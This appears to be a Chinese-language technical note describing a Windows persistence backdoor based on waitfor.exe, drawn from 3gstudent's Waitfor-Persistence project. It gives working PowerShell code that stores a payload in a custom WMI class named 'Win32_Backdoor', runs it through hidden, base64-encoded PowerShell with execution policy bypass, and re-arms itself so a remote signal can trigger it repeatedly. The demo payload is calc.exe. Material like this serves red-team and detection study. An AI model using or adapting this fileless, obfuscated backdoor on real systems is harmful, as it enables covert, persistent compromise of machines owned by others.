## Waitfor 源码

[项目地址](https://github.com/3gstudent/Waitfor-Persistence)

### 演示

`waitfor /?`

`waitfor /s 127.0.0.1 /si signalcalc`

`waitfor signalcalc && calc.exe`

### 缺点

- 触发一次后，进程waitfor.exe将退出，导致该后门无法重复使用

### 解决方案 1

```powershell
<#
	test.ps1
	执行powershell脚本，等待10秒再启动calc.exe
#>
Start-Sleep -Seconds 10;
start-process calc.exe;
```

```powershell
<#
	c:test1.ps1
#>
start-process calc.exe;
cmd /c waitfor persist `&`& powershell -executionpolicy bypass -file c:test1.ps1
```

- 开启等待模式

  `waitfor persist && powershell -executionpolicy bypass -file c:test1.ps1`

- 发送信号

  `waitfor /s 127.0.0.1 /si persist` [^1]

### 解决方案2 [^2]

```powershell
<#
	`sudo payload.ps1`
#>
$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null)
$StaticClass.Name = 'Win32_Backdoor'
$StaticClass.Put()
$StaticClass.Properties.Add('Code' , "cmd /c start calc.exe")
$StaticClass.Put() 
```

- 读取 payload

  `([WmiClass] 'Win32_Backdoor').Properties['Code'].Value` [^3]

- 执行 payload

  `$exec=([WmiClass] 'Win32_Backdoor').Properties['Code'].Value; iex $exec`

- 对执行的 payload 命令进行base64加密

  ```powershell
  <#
  	code.txt ： $exec=([WmiClass] 'Win32_Backdoor').Properties['Code'].Value; iex $exec
  #>
  $code = Get-Content -Path code.txt
  $bytes  = [System.Text.Encoding]::UNICODE.GetBytes($code);
  $encoded = [System.Convert]::ToBase64String($bytes)
  $encoded 
  <#
  	或者使用 `certutil -encode code.txt base64_code.txt`
  #>
  ```


### 完整代码

```powershell
$StaticClass = New-Object Management.ManagementClass('root\cimv2', $null,$null)
<#
	`get-help new-object -online`
	New-Object : 创建Microsoft .NET Framework或COM对象的实例
#>
$StaticClass.Name = 'Win32_Backdoor'
$StaticClass.Put()| Out-Null
$StaticClass.Properties.Add('Code' , "cmd /c start calc.exe ```&```& taskkill /f /im powershell.exe ```&```& waitfor persist ```&```& powershell -nop -W Hidden -E JABlAHgAZQBjAD0AKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwBXAGkAbgAzADIAXwBCAGEAYwBrAGQAbwBvAHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAQwBvAGQAZQAnAF0ALgBWAGEAbAB1AGUAOwAgAGkAZQB4ACAAJABlAHgAZQBjAA==")
<# 
	base64 解码为
	`$exec=([WmiClass] 'Win32_Backdoor').Properties['Code'].Value; iex $exec`
#>
$StaticClass.Put() | Out-Null

$exec=([WmiClass] 'Win32_Backdoor').Properties['Code'].Value;
iex $exec | Out-Null
```

- 开启等待模式

  `sudo powershell -executionpolicy bypass -file c:test1.ps1`

- 激活命令

  `waitfor /s 127.0.0.1 /si persist`

### 缺点

- 后台存在 waitfor 进程



[原文](https://yq.aliyun.com/articles/217554)

---

[^1]: 连续发该信号即可在远程主机上打开多个计算器程序
[^2]: 不在目标系统保存文件，即将payload保存在WMI类中，进行读取使用存储payload
[^3]: 返回结果： `cmd /c start calc.exe`

